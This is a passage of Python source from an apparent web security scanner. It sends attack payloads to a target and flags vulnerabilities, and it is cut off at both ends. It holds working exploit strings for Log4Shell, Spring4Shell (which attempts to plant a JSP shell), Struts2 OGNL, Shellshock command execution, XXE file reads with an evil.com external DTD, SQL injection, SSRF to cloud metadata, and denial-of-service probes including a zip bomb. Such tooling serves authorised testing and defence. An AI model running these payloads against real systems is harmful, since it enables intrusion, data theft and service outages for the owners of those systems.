        allow_creds = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if allow_creds == "true" and acao == "*":
             issues.append("CORS Risk: Wildcard origin with credentials allowed")

    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}

def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Host Header Injection: Cache poisoning and reset link bypasses."""
    evil_host = "evil.com"
    issues = []
    
    try:
        # FREE TIER: Basic Host header override
        resp = client.send("GET", scenario.target, headers={"Host": evil_host}, timeout=5)
        if evil_host in resp.headers.get("Location", "") or evil_host in resp.text:
            issues.append("Host Header Injection: 'evil.com' reflected in response.")
    except Exception as e:
        # If connection is refused specifically when overriding Host, it might be an indicator of a strict WAF or proxy
        if "Connection" in str(e):
             # Silently fail or log as info; don't crash
             pass

    # AGGRESSIVE TIER: X-Forwarded-Host and Host-Port bypasses
    if scenario.config.get("aggressive"):
        try:
            resp_xfh = client.send("GET", scenario.target, headers={"X-Forwarded-Host": evil_host})
            if evil_host in resp_xfh.text:
                issues.append("X-Forwarded-Host Injection: 'evil.com' reflected.")
        except: pass
            
    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}

def run_swagger_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Swagger/OpenAPI UI discovery."""
    targets = ["/v2/api-docs", "/swagger-ui.html", "/api/docs", "/swagger/index.html"]
    issues = []
    for t in targets:
         resp = client.send("GET", t)
         if resp.status_code == 200 and ("swagger" in resp.text.lower() or "openapi" in resp.text.lower()):
             issues.append(f"Swagger documentation at {t}"); break
    return {"scenario_id": scenario.id, "attack_type": "swagger_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_git_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Git Repository exposure check."""
    resp = client.send("GET", "/.git/HEAD")
    issues, artifacts = [], []
    if (resp.status_code == 200 and "refs/heads" in resp.text):
        issues.append("Exposed .git")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "git_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_env_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Environment file exposure check."""
    resp = client.send("GET", "/.env")
    issues, artifacts = [], []
    if (resp.status_code == 200 and ("DB_PASS" in resp.text or "API_KEY" in resp.text or "PORT=" in resp.text)):
        issues.append("Exposed .env")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "env_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_phpinfo(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """phpinfo() exposure check."""
    resp = client.send("GET", "/phpinfo.php")
    issues, artifacts = [], []
    if (resp.status_code == 200 and "PHP Version" in resp.text):
        issues.append("Exposed phpinfo()")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "phpinfo", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_ds_store(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """DS_Store exposure check."""
    resp = client.send("GET", "/.DS_Store")
    issues, artifacts = [], []
    if (resp.status_code == 200 and "Mac OS X" in resp.text):
        issues.append("Exposed .DS_Store")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "ds_store_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}


def run_ldap_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """LDAP Injection: Filter bypass strings."""
    payload = "*)(cn=*))"
    resp = client.send("GET", scenario.target, params={"user": payload})
    issues = ["LDAP Injection Potential"] if (resp.status_code == 200 and "admin" in resp.text.lower()) else []
    return {"scenario_id": scenario.id, "attack_type": "ldap_injection", "passed": not issues, "details": issues}

def run_xpath_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XPath Injection: Boolean bypass for XML databases."""
    payload = "' or '1'='1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["XPath Injection Risk"] if "xpath" in resp.text.lower() or resp.status_code == 200 and "admin" in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "xpath_injection", "passed": not issues, "details": issues}

def run_ssi_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SSI Injection: Server Side Includes exec probe."""
    payload = '<!--#exec cmd="ls" -->'
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["SSI Injection Found"] if "bin" in resp.text and "etc" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "ssi_injection", "passed": not issues, "details": issues}

def run_cve_log4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Log4Shell (CVE-2021-44228): JNDI Injection in headers/params."""
    # We use a unique canary for OOB if the client had one, but here we check for internal errors
    # or specific behavior that confirms the JNDI lookup was attempted
    payload = "${jndi:ldap://127.0.0.1:1389/a}"
    headers = {"User-Agent": payload}
    
    if scenario.config.get("aggressive"):
        headers.update({"X-Api-Version": payload, "Referer": payload, "Authentication": f"Bearer {payload}"})

    resp = client.send("GET", scenario.target, headers=headers)
    # Log4Shell often triggers a specific error if it tries to connect to a restricted port or non-existent server
    issues = []
    if "javax.naming.NamingException" in resp.text:
         issues.append("Log4Shell CONFIRMED: NamingException triggered by JNDI payload.")
    elif resp.status_code == 500 and ("ldap" in resp.text.lower() or "jndi" in resp.text.lower()):
         issues.append("Potential Log4Shell: Server threw a related error during JNDI injection.")

    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues or "Payloads delivered to priority headers."}

def run_cve_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Spring4Shell (CVE-2022-22965): ClassLoader resource manipulation."""
    # This attack tries to create a JSP shell by overriding Tomcat logging config
    payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # Base check
    resp = client.send("POST", scenario.target, form_body={"test": payload}, headers=headers)
    
    issues = []
    # Confirmation logic: The exploit works by creating a file. We can't see the file, 
    # but the server often returns a specific '400' or behavior change if the classLoader is successfully hit.
    if resp.status_code == 400 and "Bad Request" in resp.text:
         # Some Spring WAFs or Tomcat versions throw 400 when classLoader is blocked, 
         # but if it succeeds, it might return 200 with no change.
         pass
         
    # Verification: Try to read the Shell (if aggressive)
    if scenario.config.get("aggressive"):
        shell_path = f"{scenario.target.rsplit('/', 1)[0]}/tomcat-logs.jsp"
        resp_shell = client.send("GET", shell_path)
        if resp_shell.status_code == 200 and "java.io" in resp_shell.text:
             issues.append("Spring4Shell CONFIRMED: Shell created and accessible.")

    return {"scenario_id": scenario.id, "attack_type": "cve_spring4shell", "passed": not issues, "details": issues or "Spring4Shell delivery attempted."}

def run_cve_struts2(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Struts2 S2-045 OGNL Injection."""
    payload = "%{(#target='@java.lang.Runtime@getRuntime()').(#cmd='id').(#res=#target.exec(#cmd)).(#is=#res.getInputStream())}"
    resp = client.send("GET", scenario.target, headers={"Content-Type": payload})
    issues = ["Struts2 RCE Confirmed"] if "uid=" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "cve_struts2", "passed": not issues, "details": issues}



def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Introspection: Schema extraction."""
    resp = client.send("POST", scenario.target, json_body={"query": "{__schema{types{name}}}"})
    issues = ["GraphQL Introspection Enabled"] if "__schema" in resp.text and "types" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_introspection", "passed": not issues, "details": issues}

def run_graphql_batching(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Batching: Multiple queries in one request."""
    resp = client.send("POST", scenario.target, json_body={"query": "query { a: __typename b: __typename }"})
    issues = ["GraphQL Batching Allowed"] if '"a":"' in resp.text and '"b":"' in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_batching", "passed": not issues, "details": issues}

def run_rsc_server_action_forge(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Next.js Server Action forging."""
    resp = client.send("POST", scenario.target, headers={"Next-Action": "e6cf88b5d3c8f8d9b1c5", "RSC": "1"}, form_body="[]")
    issues = ["Server Action logic reached"] if resp.status_code == 500 and "Digest" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_server_action_forge", "passed": not issues, "details": issues}

def run_ssr_ssrf(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC SSR SSRF via Host headers."""
    payload = "http://169.254.169.254/latest/meta-data/"
    resp = client.send("GET", scenario.target, headers={"X-Forwarded-Host": payload})
    issues = ["Potential SSR SSRF"] if "ami-id" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_ssr_ssrf", "passed": not issues, "details": issues}

def run_hydration_collapse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Hydration tampering."""
    resp = client.send("GET", scenario.target, headers={"X-Nextjs-Data": "invalid"})
    issues = ["Hydration Error Triggered"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_hydration_collapse", "passed": not issues, "details": issues}

def run_flight_trust_boundary_violation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Flight Stream boundary violation: Prototype tampering and state leakage."""
    payload = {"__proto__": {"polluted": "true"}, "rsc": "1"}
    resp = client.send("POST", scenario.target, json_body=payload, headers={"Content-Type": "text/x-component", "Next-Action": "12345"})
    
    issues, artifacts = [], []
    # Real evidence: Error messages containing server-side paths or flight stream format violations
    if "Flight " in resp.text or "Error: Cannot find module" in resp.text:
         issues.append("RSC Flight Boundary Leak detected (Detailed error message)")
         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    elif resp.status_code == 200 and "polluted" in resp.text:
         issues.append("Confirmed Prototype Pollution via Flight Stream")
         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
         
    return {"scenario_id": scenario.id, "attack_type": "rsc_flight_trust_boundary_violation", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_json_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JSON Bomb: Nested objects recursion."""
    nested = "{}"
    depth = 2000 if scenario.config.get("aggressive") else 500
    for _ in range(depth): nested = '{"a": ' + nested + '}'
    resp = client.send(scenario.method, scenario.target, form_body=nested, headers={"Content-Type": "application/json"})
    issues = ["JSON Recursion Crash"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "json_bomb", "passed": not issues, "details": issues}



def run_file_upload_abuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """File Upload Abuse: Polyglot extensions."""
    payload = {'file': ('test.php.png', '<?php echo "BRK_RCE"; ?>', 'image/png')}
    resp = client.send("POST", scenario.target, form_body={"submit": "1"})
    issues, artifacts = [], []
    if resp.status_code == 200:
        issues.append("Polyglot Upload Accepted")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "file_upload_abuse", "passed": not issues, "details": issues, "artifacts": artifacts}



def run_rsc_cache_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """RSC Cache Poisoning: Vary header check."""
    resp = client.send("GET", scenario.target, headers={"RSC": "1"})
    vary = resp.headers.get("Vary", "")
    issues = ["Missing Vary in RSC response"] if "RSC" not in vary and "text/x-component" in resp.headers.get("Content-Type", "") else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_cache_poisoning", "passed": not issues, "details": issues}

def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CRLF Injection: Header split probe."""
    payload = "test%0d%0aSet-Cookie:BRK_CRLF=1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues, artifacts = [], []
    if "BRK_CRLF" in resp.headers.get("Set-Cookie", ""):
        issues.append("CRLF Success: Malicious cookie injected via header splitting")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "crlf_injection", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Shellshock (CVE-2014-6271): Bash environment variable injection."""
    # FREE TIER: Standard echo check
    payload = "() { :; }; echo; /bin/bash -c 'id'"
    
    # AGGRESSIVE TIER: Variant payloads for bypass
    if scenario.config.get("aggressive"):
        payload = "() { _; } >_[$($())] { id; }"

    resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
    issues, artifacts = [], []
    if "uid=" in resp.text:
        issues.append("Shellshock RCE CONFIRMED: 'id' output detected")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    
    return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XML External Entity: Local file exfiltration via DOCTYPE."""
    # FREE TIER: Simple system entity
    payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # AGGRESSIVE TIER: Parameter entities and PHP filters
    if scenario.config.get("aggressive"):
        payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/x.dtd">%remote;]><a>&exfil;</a>'

    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
    issues, artifacts = [], []
    
    if "root:x:0:0" in resp.text or "bin/bash" in resp.text:
        issues.append("XXE Confirmed: Local file (/etc/passwd) extracted.")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    elif resp.status_code == 200 and len(resp.text) > 2000:
        issues.append("Potential Blind XXE: Unexpectedly large response.")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
        
    return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_malformed_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JSON Parsing Security: Fuzzing parser stability."""
    payloads = ['{"a":' * 100, '{"valid": "json", }', '["a",]']
    issues = []
    for p in payloads:
        resp = client.send("POST", scenario.target, form_body=p, headers={"Content-Type": "application/json"})
        if resp.status_code == 500:
            issues.append(f"Potential parser crash with {p[:10]}")
    return {"scenario_id": scenario.id, "attack_type": "malformed_json", "passed": not issues, "details": issues}

def run_poodle_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SSLv3 POODLE Vulnerability check."""
    issues = []
    if client.base_url.startswith("https"):
        try:
            context = ssl.create_default_context()
            # Modern Python might literal refuse to even create a context with just SSLv3
            # But we try to handshake or check cipher suites
            with socket.create_connection((urllib.parse.urlparse(client.base_url).hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=urllib.parse.urlparse(client.base_url).hostname) as ssock:
                    if ssock.version() == "SSLv3":
                        issues.append("Server accepted SSLv3 (POODLE vulnerable)")
        except: pass
    return {"scenario_id": scenario.id, "attack_type": "poodle", "passed": not issues, "details": issues}

def run_debug_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    targets = ["/admin", "/debug", "/actuator", "/.env", "/phpinfo.php", "/config.json"]
    issues, artifacts = [], []
    for t in targets:
        resp = client.send("GET", t)
        if resp.status_code == 200 and not client.is_soft_404(resp) and len(resp.text) > 20: 
            issues.append(f"Exposed Endpoint: {t}")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_secret_leak(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send(scenario.method, scenario.target)
    sigs = ["AWS_ACCESS_KEY_ID", "BEGIN RSA PRIVATE KEY", "AIzaSy", "sk_live_"]
    issues, artifacts = [], []
    for s in sigs:
        if s in resp.text: 
            issues.append(f"Secret leaked: {s}")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_race_condition(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Race Condition: Simultaneous Request Flooding."""
    # Real logic: Send N requests simultaneously and check if final state is inconsistent
    threads = 50 if scenario.config.get("aggressive") else 10
    url = scenario.target
    
    # Synchronization barrier to ensure simultaneous execution
    barrier = threading.Barrier(threads)
    results = []
    lock = threading.Lock()
    
    def attack():
        try:
            barrier.wait(timeout=5)
        except: pass
        
        # Attack Payload (e.g., coupon redemption, transfer, limit bypass)
        resp = client.send("POST", url, json_body={"amount": 1, "coupon": "RACE_TEST"})
        with lock:
            results.append(resp)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack) for _ in range(threads)]
        concurrent.futures.wait(futures)
        
    # Verification: Did we get more successes than allowed?
    success_count = len([r for r in results if r.status_code == 200])
    
    issues = []
    if success_count > 1:
        issues.append(f"Potential Race Condition: {success_count}/{threads} requests succeeded simultaneously.")
        
    return {
        "scenario_id": scenario.id, 
        "attack_type": "race_condition", 
        "passed": not issues, 
        "status": "CONFIRMED" if issues else "SECURE",
        "details": issues,
        "artifacts": [{"response_dump": r.response_dump} for r in results if r.status_code == 200][:3] 
    }

def run_otp_reuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """OTP Reuse: Checking if a once-used token can be reused."""
    resp1 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    resp2 = client.send("POST", scenario.target, json_body={"otp": "123456"})
    issues, artifacts = [], []
    if resp1.status_code == 200 and resp2.status_code == 200:
        issues.append("OTP reused successfully")
        artifacts.append({"request": resp2.request_dump, "response": resp2.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Web Cache Deception: Checking if SPA routes are incorrectly cached as static assets."""
    # We request a non-existent CSS file at a real path
    path = f"{scenario.target.rstrip('/')}/nonexistent_99.css"
    resp = client.send("GET", path)
    
    issues, artifacts = [], []
    # Detection: If it's 200 OK + text/html, it's usually just a SPA route (False Positive)
    # UNLESS we see a public cache header
    cache_header = resp.headers.get("Cache-Control", "").lower()
    is_public = "public" in cache_header or "max-age" in cache_header
    
    if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", ""):
        if not client.is_soft_404(resp) and is_public:
             issues.append("Potential Web Cache Deception: Private HTML cached as public CSS.")
             artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    
    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = {"tracker": "_$$ND_FUNC$$_function (){ return 'BRK_RCE'; }()"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues, artifacts = [], []
    if "BRK_RCE" in resp.text:
        issues.append("Node.js Deserialization RCE")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_union_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Union-based SQL Injection: Dumping data via UNION SELECT."""
    column_probes = ["NULL", "'a'", "1"]
    issues, artifacts = [], []
    field = scenario.config.get("fields", ["id"])[0]
    
    for i in range(1, 10):
        cols = ", ".join([column_probes[0]] * i)
        payload = f"' UNION SELECT {cols}--"
        resp = client.send(scenario.method, scenario.target, params={field: payload})
        if resp.status_code == 200 and "the used SELECT statements have a different number of columns" not in resp.text:
            # Possible match, try to confirm with a known string
            cols_with_mark = ", ".join(["'BRK_UNION'"] + [column_probes[0]] * (i-1))
            payload_confirm = f"' UNION SELECT {cols_with_mark}--"
            resp_confirm = client.send(scenario.method, scenario.target, params={field: payload_confirm})
            if "BRK_UNION" in resp_confirm.text:
                issues.append(f"Union SQLi Confirmed: {i} columns found.")
                artifacts.append({"request": resp_confirm.request_dump, "response": resp_confirm.response_dump})
                break
    
    return {"scenario_id": scenario.id, "attack_type": "union_sqli", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_second_order_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Second-order SQL Injection: Injecting in one place, triggering in another."""
    inject_payload = "admin'--"
    target_field = scenario.config.get("fields", ["username"])[0]
    
    # 1. Inject (e.g., registration or profile update)
    client.send("POST", scenario.target, json_body={target_field: inject_payload})
    
    # 2. Check another page (e.g., profile view or user list)
    check_url = scenario.config.get("check_url", scenario.target)
    resp = client.send("GET", check_url)
    
    issues = []
    # Real second order logic: If injected pattern leads to a state change visible on other endpoints
    if "admin" in resp.text and inject_payload not in resp.text:
         issues.append("Second-order SQLi Confirmed: Malicious state change detected via separate endpoint.")
    
    return {"scenario_id": scenario.id, "attack_type": "second_order_sqli", "passed": not issues, "details": issues}

def run_graphql_depth_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """GraphQL Query Depth: Exhausting resources via recursive fragments."""
    query = "query { a { " * 20 + "id" + " } }" * 20
    resp = client.send("POST", scenario.target, json_body={"query": query})
    issues = ["GraphQL Depth Denial of Service"] if resp.status_code >= 500 or resp.elapsed_ms > 5000 else []
    return {"scenario_id": scenario.id, "attack_type": "graphql_depth", "passed": not issues, "details": issues}

def run_elasticsearch_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Elasticsearch Query Injection."""
    payloads = ["*", "{\"match_all\":{}}", "_search?size=1000"]
    fields = scenario.config.get("fields", ["q", "query"])
    issues, artifacts = [], []
    for f in fields:
        for p in payloads:
            resp = client.send(scenario.method, scenario.target, params={f: p})
            if resp.status_code == 200 and ("_shards" in resp.text or "hits" in resp.text):
                issues.append(f"Elasticsearch Injection in '{f}'")
                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                break
    return {"scenario_id": scenario.id, "attack_type": "elasticsearch_injection", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_server_side_search_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server-side search query injection (generic)."""
    payload = scenario.config.get("payload", "*")
    resp = client.send(scenario.method, scenario.target, params={"sq": payload})
    issues = ["Search Injection detected"] if resp.status_code == 200 and "admin" in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "search_injection", "passed": not issues, "details": issues}

def run_parameter_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Parameter Pollution: Multiple params with same name."""
    field = scenario.config.get("fields", ["id"])[0]
    resp = client.send(scenario.method, scenario.target, params={field: ["1", "2"]})
    issues, artifacts = [], []
    if "2" in resp.text and "1" not in resp.text:
        issues.append("HPP Detected (Last parameter win)")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_csrf_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CSRF: Checking for missing anti-CSRF tokens in write operations."""
    # Attempt a POST without tokens
    resp = client.send("POST", scenario.target, form_body={"submit": "1"})
    issues, artifacts = [], []
    # If 200 OK and no CSRF error keywords, it's likely vulnerable
    if resp.status_code == 200 and not any(k in resp.text.lower() for k in ["csrf", "token", "invalid", "forbidden"]):
        issues.append("Potential CSRF: Action accepted without anti-CSRF token")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "csrf", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_password_reset_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Password Reset Poisoning via Host Header manipulation."""
    payload = "evil.breakpoint.internal"
    resp = client.send("POST", scenario.target, headers={"X-Forwarded-Host": payload}, json_body={"email": "audit-victim@test.com"})
    issues, artifacts = [], []
    if resp.status_code == 200 and payload in resp.text:
        issues.append("Password Reset Poisoning: Target reflected host header in response")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_session_fixation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Session Fixation: Checking if session ID persists after transition."""
    # 1. Get initial session
    resp1 = client.send("GET", "/")
    s1 = resp1.headers.get("Set-Cookie", "")
    
    # 2. Perform 'login' (simulated or real if creds provided)
    resp2 = client.send("POST", scenario.target, form_body={"user": "test", "pass": "test"})
    s2 = resp2.headers.get("Set-Cookie", "")
    
    issues, artifacts = [], []
    if s1 and s2 and s1 == s2:
        issues.append("Session Fixation: Session ID did not change after login")
        artifacts.append({"request": resp2.request_dump, "response": f"Session ID remains: {s1}"})
        
    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_mass_assignment(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Mass Assignment: Attempting to overwrite protected fields."""
    payload = {"username": "breakpoint_audit", "is_admin": True, "role": "admin", "permissions": ["*"]}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues, artifacts = [], []
    if resp.status_code == 200 and ("is_admin" in resp.text or "role" in resp.text):
        issues.append("Mass Assignment (High Confidence: Protected fields accepted)")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_tenant_isolation_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Tenant Isolation: Checking for multi-tenant data leakage."""
    resp = client.send("GET", scenario.target, headers={"X-Tenant-ID": "999999"})
    issues, artifacts = [], []
    if resp.status_code == 200 and "tenant" in resp.text.lower():
        issues.append("Tenant Isolation Failure: Access granted to non-existent or blocked tenant ID")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_oauth_redirect_manipulation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """OAuth Redirect URI Hijacking."""
    evil_url = "http://evil.audit.com"
    resp = client.send("GET", scenario.target, params={"redirect_uri": evil_url, "client_id": "audit_client"})
    issues, artifacts = [], []
    if resp.status_code == 302 and evil_url in resp.headers.get("Location", ""):
        issues.append("OAuth Redirect Hijack: Target redirected to external origin")
        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
    return {"scenario_id": scenario.id, "attack_type": "oauth_redirect", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_verb_tampering(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Verb Tampering: Bypassing auth with HEAD/PUT/DELETE."""
    methods = ["HEAD", "PUT", "DELETE", "PATCH", "TRACE"]
    issues, artifacts = [], []
    for m in methods:
        resp = client.send(m, scenario.target)
        if resp.status_code == 200 and not client.is_soft_404(resp):
            issues.append(f"Verb Tampering: Resource accessible via {m}")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
            break
    return {"scenario_id": scenario.id, "attack_type": "verb_tampering", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_slow_post_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Slow POST: Probe for resource exhaustion via lingering connections."""
    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": True, "details": "Non-aggressive mode."}
    try:
        # Simulate the start of a slow POST
        client.send("POST", scenario.target, form_body="A"*50000, timeout=2)
        return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": True, "details": "Target handled large post within timeout."}
    except:
        return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": False, "status": "VULNERABLE", "details": "Target timeout during sustained payload delivery (Potential Slow POST)."}

def run_archive_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Archive Bomb: Sending highly compressed data to trigger CPU/Memory exhaustion."""
    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": True, "details": "Non-aggressive mode."}
    
    # AGGRESSIVE: Real Zip Bomb (100MB uncompressed)
    # We construct a zip file containing a file with 100MB of zeros.
    # This compresses to a very small size but expands to consume memory/disk on server.
    try:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # 100MB of '0's
            zf.writestr('bomb.txt', '0' * 100 * 1024 * 1024)
        
        bomb_data = buffer.getvalue()
        
        resp = client.send("POST", scenario.target, form_body={"file": ("bomb.zip", bomb_data, "application/zip")})
        issues = ["Archive Bomb Vulnerability (High Latency during decompression)"] if resp.elapsed_ms > 3000 else []
    except Exception as e:
